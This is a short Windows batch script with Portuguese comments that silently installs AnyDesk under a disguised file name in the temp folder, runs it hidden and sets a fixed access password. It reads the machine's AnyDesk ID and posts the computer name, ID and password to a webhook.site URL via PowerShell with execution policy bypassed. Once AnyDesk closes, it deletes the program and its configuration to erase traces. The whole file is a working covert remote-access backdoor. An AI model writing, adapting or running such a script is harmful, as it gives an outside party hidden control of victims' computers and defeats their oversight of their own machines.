@echo off
set "URL=https://download.anydesk.com/AnyDesk.exe"
set "ARQUIVO=%temp%\Any_Russo.exe"
set "WEBHOOK=https://webhook.site/1070b89e-8689-4293-b09a-2e166cfba592"
set "SENHA_ACESSO=10978"

:: 1. Limpeza e Download Silencioso
taskkill /f /t /im AnyDesk.exe >nul 2>&1
curl -L -s -o "%ARQUIVO%" %URL%

:: 2. Inicia o AnyDesk em modo minimizado/escondido
start /min "" "%ARQUIVO%"
timeout /t 5 /nobreak >nul
"%ARQUIVO%" --set-password %SENHA_ACESSO% >nul 2>&1

:: 3. Loop de captura do ID
:PROCURAR_ID
set "ANY_ID="
if exist "%appdata%\AnyDesk\system.conf" (
    for /f "tokens=2 delims==" %%A in ('findstr "ad.anynet.id" "%appdata%\AnyDesk\system.conf"') do set "ANY_ID=%%A"
)
if "%ANY_ID%"=="" (
    timeout /t 2 /nobreak >nul
    goto PROCURAR_ID
)
set "ANY_ID=%ANY_ID: =%"

:: 4. Envio Silencioso para o Webhook
powershell -ExecutionPolicy Bypass -Command "$body = @{maquina='%COMPUTERNAME%'; anydesk_id='%ANY_ID%'; senha='%SENHA_ACESSO%'; status='Fantasma_Online'}; Invoke-RestMethod -Uri '%WEBHOOK%' -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'" >nul 2>&1

:: 5. Espera o encerramento para limpar os rastros (Invisivel)
:ESPERAR_FECHAR
tasklist /FI "IMAGENAME eq AnyDesk.exe" 2>NUL | find /I /N "AnyDesk.exe">NUL
if "%ERRORLEVEL%"=="0" (
    timeout /t 5 /nobreak >nul
    goto ESPERAR_FECHAR
)

:: Limpeza Final
taskkill /f /t /im AnyDesk.exe >nul 2>&1
timeout /t 2 /nobreak >nul
del /f /q /a "%ARQUIVO%" >nul 2>&1
rmdir /s /q "%appdata%\AnyDesk" >nul 2>&1
rmdir /s /q "%programdata%\AnyDesk" >nul 2>&1
exit